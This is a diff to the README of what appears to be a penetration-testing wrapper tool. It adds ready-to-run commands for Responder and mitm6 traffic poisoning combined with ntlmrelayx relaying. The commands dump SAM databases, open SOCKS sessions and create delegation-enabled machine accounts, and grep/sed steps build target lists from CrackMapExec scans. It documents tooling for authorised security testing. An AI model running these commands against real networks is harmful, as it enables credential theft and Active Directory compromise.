@@ -152,56 +152,96 @@ deps/cme mssql $targets >> loot/cme_enum_mssql.txt
 ```
 
 ### Poison
-<details>
-<summary>Generate target lists from CME output</summary>
+#### Generate target lists from CME output
+Generates the following target lists to be used for traffic poisoning:
+- `loot/smb_targets.txt`
+- `loot/ldap_targets.txt`
+- `loot/mssql_targets.txt`
+- `loot/multi_targets.txt`
 
-</details>
-<details>
-<summary>SMB: Responder + ntlmrelayx (SAM dump)</summary>
+This works by filtering output from each CME enumeration module based on the domain environment variable. This ensures that hosts that are not domain-joined do not receieve authentication attempts from modules.
 
-</details>
-<details>
-<summary>SMB: Responder + ntlmrelayx (socks)</summary>
+Verbose commands:
+```bash
+grep -F -- "$domain" loot/cme_enum_smb.txt | grep 'signing:False' | cut -d " " -f 10 > loot/smb_targets.txt
+grep -F -- "$domain" loot/cme_enum_ldap.txt | cut -d " " -f 10 > loot/ldap_targets.txt
+grep -F -- "$domain" loot/cme_enum_mssql.txt | cut -d " " -f 10 > loot/mssql_targets.txt
+sed 's/^/smb:\/\//g' loot/smb_targets.txt >> loot/multi_targets.txt
+sed 's/^/ldap:\/\//g' loot/ldap_targets.txt >> loot/multi_targets.txt
+sed 's/^/mssql:\/\//g' loot/mssql_targets.txt >> loot/multi_targets.txt
+```
 
-</details>
-<details>
-<summary>LDAP: Responder + ntlmrelayx (socks)</summary>
+#### SMB: Responder + ntlmrelayx (SAM dump)
+Utilizes Responder for LLMNT/NBT-NS/MDNS traffic poisoning and ntlmrelayx to relay it to hosts without SMB signing. If the relayed authentication possesses administrative access it will attempt to dump the contents of the SAM database on the remote host.
 
+Can be run against a single host or a list of targets defined in `loot/smb_targets.txt`
+
+Verbose commands:
+```python3
+python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w
+ntlmrelayx.py -t ${solo_target} -smb2support
+```
+
+#### SMB: Responder + ntlmrelayx (socks)
+Utilizes Responder for LLMNR/NBT-NS/MDNS traffic poisoning and ntlmrelayx to authenticate to target hosts and establish a session that can be used over a SOCKS proxy.
+
+Can be run against a single host or a list of targets defined in `loot/smb_targets.txt`.
+
+Verbose commands:
+```python
+python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w
+ntlmrelayx.py -tf/-t <target file or single target> -smb2support -socks
+```
+
+#### LDAP: Responder + ntlmrelayx (socks)
+Utilizes Responder for LLMNR/NBT-NS/MDNS traffic poisoning and ntlmrelayx to authenticate to target hosts and establish a session that can be used over a SOCKS proxy.
   
 Can be run against a single host or a list of targets defined in `loot/ldap_targets.txt`.
-</details>
 
-<details>
-<summary>LDAP: Responder + ntlmrelayx (delegate access)</summary>
+Verbose commands:
+```python
+python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w
+ntlmrelayx.py -tf/-t <target file or single target> -smb2support -socks -wh fake-wpad
+```
+
+#### LDAP: Responder + ntlmrelayx (delegate access)
 Utilizes Responder for LLMNR/NBT-NS/MDNS traffic poisoning and ntlmrelayx to create a machine account with delegation rights.
-<br>  
+
 Can be run against a single host or a list of targets defined in `loot/ldap_targets.txt`.
-</details>
 
-<details>
-<summary>NOT IMPLEMENTED: MSSQL: Responder + ntlmrelayx</summary>
+Verbose commands:
+```python
+python3 deps/Responder/Responder.py -I ${interface} --lm --disable-ess -w
+ntlmrelayx.py -tf/-t <target file or single target> -smb2support --delegate-access -wh fake-wpad
+```
+
+#### NOT IMPLEMENTED: MSSQL: Responder + ntlmrelayx
 TODO
-</details>
-<br>
 
-<details>
-<summary>NOT IMPLEMENTED: MULTI: Responder + ntlmrelayx</summary>
+#### >NOT IMPLEMENTED: MULTI: Responder + ntlmrelayx
 TODO
-</details>
 
-<details>
-<summary>LDAP: mitm6 + ntlmrelayx (socks)</summary>
-Utilizes mitm6 for DHCPv6 traffic poisoning and ntlmrelayx to create relay coerced HTTP traffic to remote LDAP service(s) and create a socks session.
-<br>  
+#### LDAP: mitm6 + ntlmrelayx (socks)
+Utilizes mitm6 for DHCPv6 traffic poisoning and ntlmrelayx to create relay coerced HTTP traffic to remote LDAP service(s) and establish a session that can be used over a SOCKS proxy.
+
 Can be run against a single host or a list of targets defined in `loot/ldap_targets.txt`.
-</details>
 
-<details>
-<summary>LDAP: mitm6 + ntlmrelayx (delegate access)</summary>
+Verbose commands:
+```python
+mitm6 -d ${domain} -i ${interface} --ignore-nofqdn
+ntlmrelayx.py -tf/-t <target file or single target> -smb2support -socks -wh fake-wpad
+```
+
+#### LDAP: mitm6 + ntlmrelayx (delegate access)
 Utilizes mitm6 for DHCPv6 traffic poisoning and ntlmrelayx to create a machine account with delegation rights.
-<br>  
+
 Can be run against a single host or a list of targets defined in `loot/ldap_targets.txt`.
-</details>
+
+Verbose commands:
+```python
+mitm6 -d ${domain} -i ${interface} --ignore-nofqdn
+ntlmrelayx.py -tf/-t <target file or single target> -smb2support --delegate-access -wh fake-wpad
+```
 
 ### AD
 All AD modules require the `username (-u)`, `password (-p)`, `domain (-d)`, and `domain controller (-c)` arguments to be set.
